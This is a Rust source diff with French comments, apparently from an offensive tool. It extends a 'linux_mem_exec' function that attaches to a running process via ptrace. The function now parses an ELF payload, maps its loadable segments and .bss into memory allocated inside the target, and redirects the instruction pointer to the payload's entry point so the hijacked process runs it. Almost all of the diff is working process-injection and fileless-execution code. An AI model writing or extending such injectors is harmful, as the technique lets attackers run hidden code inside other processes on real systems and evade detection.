@@ -14,7 +14,7 @@ use std::ptr;
 use libc::{
     c_void, pid_t, ptrace, user_regs_struct, waitpid, PTRACE_ATTACH, PTRACE_CONT,
     PTRACE_DETACH, PTRACE_GETREGS, PTRACE_PEEKTEXT, PTRACE_POKETEXT, PTRACE_SETREGS,
-    PTRACE_TRACEME, WIFSTOPPED, WSTOPSIG, SIGTRAP
+    PTRACE_TRACEME, WIFSTOPPED, WSTOPSIG, SIGTRAP, Elf64_Ehdr, Elf64_Phdr, PT_LOAD
 };
 
 // =============================================================
@@ -47,12 +47,56 @@ pub fn linux_mem_exec(payload: Vec<u8>) {
         }
         println!("[+] Mémoire allouée avec succès à l'adresse: {:#x}", allocated_addr);
 
-        // 4. Écrire le payload dans la nouvelle zone mémoire
-        println!("[*] Injection du payload dans la mémoire...");
-        write_memory(pid, allocated_addr, &payload);
+        // 4. Analyser l'en-tête ELF et charger les segments en mémoire
+        println!("[*] Analyse de l'en-tête ELF...");
 
-        // 5. Modifier le registre RIP pour pointer sur notre payload
-        regs.rip = allocated_addr;
+        let ehdr_ptr = payload.as_ptr() as *const Elf64_Ehdr;
+        let ehdr = &*ehdr_ptr;
+
+        // Vérification des Magic Bytes (\x7F E L F)
+        if ehdr.e_ident[0] != 0x7F || ehdr.e_ident[1] != 0x45 || ehdr.e_ident[2] != 0x4C || ehdr.e_ident[3] != 0x46 {
+            println!("[-] Erreur : Le payload n'est pas un binaire ELF valide !");
+            ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
+            return;
+        }
+
+        println!("[+] Binaire ELF détecté. Entry Point : {:#x}", ehdr.e_entry);
+
+        // Pointage vers la table des Program Headers
+        let phdr_table = payload.as_ptr().add(ehdr.e_phoff as usize) as *const Elf64_Phdr;
+
+        for i in 0..ehdr.e_phnum {
+            let phdr = &*phdr_table.add(i as usize);
+
+            // On ne s'intéresse qu'aux segments qui doivent être chargés en mémoire
+            if phdr.p_type == PT_LOAD {
+                let dest_addr = allocated_addr + phdr.p_vaddr;
+                let src_start = phdr.p_offset as usize;
+                let src_end = src_start + phdr.p_filesz as usize;
+
+                // A. Copier le contenu réel du fichier vers la mémoire allouée
+                if phdr.p_filesz > 0 && src_end <= payload.len() {
+                    let segment_data = &payload[src_start..src_end];
+                    write_memory(pid, dest_addr, segment_data);
+                    println!("[+] Segment PT_LOAD mappé à {:#x} (taille fichier: {})", dest_addr, phdr.p_filesz);
+                }
+
+                // B. Gérer la section .bss (Variables non initialisées)
+                // Si la taille requise en mémoire est plus grande que la taille dans le fichier,
+                // le reste doit être rempli de zéros.
+                if phdr.p_memsz > phdr.p_filesz {
+                    let bss_size = (phdr.p_memsz - phdr.p_filesz) as usize;
+                    let bss_addr = dest_addr + phdr.p_filesz;
+                    let zeros = vec![0u8; bss_size];
+                    write_memory(pid, bss_addr, &zeros);
+                    println!("[+] Zone .bss (zéros) allouée à {:#x} (taille: {})", bss_addr, bss_size);
+                }
+            }
+        }
+
+        // 5. Rediriger le processeur vers le VRAI point d'entrée de l'ELF
+        regs.rip = allocated_addr + ehdr.e_entry;
+        println!("[*] Pointeur d'instruction (RIP) modifié vers : {:#x}", regs.rip);
         ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &mut regs as *mut _ as *mut c_void);
 
         // 6. Relâcher le processus (il exécutera notre code)
